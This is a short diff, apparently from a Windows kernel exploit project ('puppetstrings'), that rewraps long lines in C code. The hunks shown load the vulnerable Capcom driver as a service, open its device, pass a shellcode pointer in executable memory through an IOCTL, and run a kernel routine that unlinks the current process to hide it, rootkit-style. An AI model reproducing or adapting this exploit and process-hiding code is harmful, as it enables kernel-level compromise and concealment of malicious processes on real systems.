@@ -24,7 +24,8 @@ static void kernel_func(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress)
 {
 	//__debugbreak();
 
-	FARPROC pPsGetCurrentProcess = get_routine(pMmGetSystemRoutineAddress, L"PsGetCurrentProcess");
+	FARPROC pPsGetCurrentProcess = 
+		get_routine(pMmGetSystemRoutineAddress, L"PsGetCurrentProcess");
 
 	PEPROCESS pProcess = (PEPROCESS)pPsGetCurrentProcess();
 	rootkit_unlink(pProcess);
@@ -35,7 +36,9 @@ void run_exploit(HANDLE hDevice)
 	DWORD dwBytesReturned;
 	DWORD dwOutBuffer = 0;
 
-	PIOCTL_IN_BUFFER InBufferContents = (PIOCTL_IN_BUFFER)VirtualAlloc(NULL, sizeof(IOCTL_IN_BUFFER), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	PIOCTL_IN_BUFFER InBufferContents = 
+		(PIOCTL_IN_BUFFER)VirtualAlloc(NULL, sizeof(IOCTL_IN_BUFFER),
+					       MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	
 	InBufferContents->ShellcodeAddress = &InBufferContents->Shellcode;
 
@@ -59,8 +62,10 @@ BOOL puppetstrings(const char *szDriverPath)
 	if (!install_service(CAPCOM_SERVICE, szDriverPath))
 		return FALSE;
 
-	HANDLE hDevice = CreateFileA(CAPCOM_DEVICE, GENERIC_READ | GENERIC_WRITE,
-		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hDevice = 
+		CreateFileA(CAPCOM_DEVICE, GENERIC_READ | GENERIC_WRITE,
+		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
+		FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (hDevice == INVALID_HANDLE_VALUE)
 		return FALSE;
